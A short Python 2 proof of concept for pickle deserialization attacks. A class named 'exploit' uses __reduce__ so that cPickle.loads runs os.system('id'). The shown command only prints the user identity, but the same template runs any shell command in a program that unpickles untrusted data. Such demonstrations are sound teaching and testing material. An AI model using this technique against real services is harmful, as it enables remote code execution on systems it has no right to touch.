import cPickle
import os
 
class exploit(object):
  def __reduce__(self):
    return (os.system, ('id',))
 
pd = cPickle.dumps(exploit())
 
cPickle.loads(pd)
